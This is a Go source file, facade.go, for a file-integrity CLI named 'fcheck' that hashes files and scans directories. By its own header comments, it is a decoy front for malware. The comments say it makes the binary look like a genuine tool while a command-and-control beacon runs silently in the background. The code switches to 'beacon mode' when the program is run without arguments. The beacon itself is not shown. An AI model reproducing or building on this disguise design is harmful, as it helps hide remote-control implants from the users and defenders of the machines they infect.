// facade.go — Legitimate CLI facade that makes the binary a real working tool
// The binary works as a genuine file integrity checker / hash calculator.
// The C2 beacon runs silently in the background.
// This makes main()'s code path 100% legitimate — only a background goroutine beacons.
package main

import (
	"crypto/md5"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"hash"
	"io"
	"os"
	"path/filepath"
	"strings"
)

// RunFacadeCLI processes command-line arguments as a file integrity tool.
// Returns true if facade handled the invocation (user ran with args).
// Returns false if no args were provided (run beacon silently).
func RunFacadeCLI(args []string) bool {
	if len(args) <= 1 {
		return false // No args = run as service (beacon mode)
	}

	cmd := args[1]

	switch cmd {
	case "--help", "-h", "help":
		printUsage()
		return true
	case "--version", "-V":
		fmt.Printf("fcheck v%s (%s)\n", buildVersion, buildDate)
		return true
	case "hash", "check", "verify":
		if len(args) < 3 {
			fmt.Fprintf(os.Stderr, "Usage: fcheck %s <file> [--algo sha256|sha1|md5]\n", cmd)
			os.Exit(1)
		}
		algo := "sha256"
		files := []string{}
		for i := 2; i < len(args); i++ {
			if args[i] == "--algo" && i+1 < len(args) {
				algo = args[i+1]
				i++
			} else if !strings.HasPrefix(args[i], "-") {
				files = append(files, args[i])
			}
		}
		for _, f := range files {
			h, err := hashFile(f, algo)
			if err != nil {
				fmt.Fprintf(os.Stderr, "Error: %s: %v\n", f, err)
				continue
			}
			fmt.Printf("%s  %s\n", h, f)
		}
		return true
	case "scan":
		if len(args) < 3 {
			fmt.Fprintf(os.Stderr, "Usage: fcheck scan <directory> [--ext .exe,.dll]\n")
			os.Exit(1)
		}
		dir := args[2]
		exts := []string{}
		for i := 3; i < len(args); i++ {
			if args[i] == "--ext" && i+1 < len(args) {
				exts = strings.Split(args[i+1], ",")
				i++
			}
		}
		scanDirectory(dir, exts)
		return true
	default:
		// Treat as file path for hashing
		if _, err := os.Stat(cmd); err == nil {
			h, _ := hashFile(cmd, "sha256")
			fmt.Printf("%s  %s\n", h, cmd)
			return true
		}
		fmt.Fprintf(os.Stderr, "Unknown command: %s\nRun 'fcheck --help' for usage.\n", cmd)
		return true
	}
}

func printUsage() {
	fmt.Println(`fcheck — File Integrity Checker

Usage:
  fcheck <file>                    Hash a file (SHA-256)
  fcheck hash <file> [--algo ALG]  Hash with specific algorithm
  fcheck scan <dir> [--ext .exe]   Scan directory for file hashes
  fcheck verify <file>             Verify file integrity
  fcheck --version                 Show version
  fcheck --help                    Show this help

Algorithms: sha256 (default), sha1, md5

Examples:
  fcheck document.pdf
  fcheck hash /usr/bin/ls --algo sha1
  fcheck scan /etc --ext .conf,.cfg
  fcheck --version`)
}

func hashFile(path string, algo string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()

	var h hash.Hash
	switch strings.ToLower(algo) {
	case "md5":
		h = md5.New()
	case "sha1":
		h = sha1.New()
	default:
		h = sha256.New()
	}

	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}
	return hex.EncodeToString(h.Sum(nil)), nil
}

func scanDirectory(dir string, exts []string) {
	count := 0
	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		if len(exts) > 0 {
			ext := filepath.Ext(path)
			match := false
			for _, e := range exts {
				if strings.EqualFold(ext, strings.TrimSpace(e)) {
					match = true
					break
				}
			}
			if !match {
				return nil
			}
		}
		h, err := hashFile(path, "sha256")
		if err != nil {
			return nil
		}
		fmt.Printf("%s  %s\n", h, path)
		count++
		return nil
	})
	fmt.Fprintf(os.Stderr, "\n%d files scanned.\n", count)
}
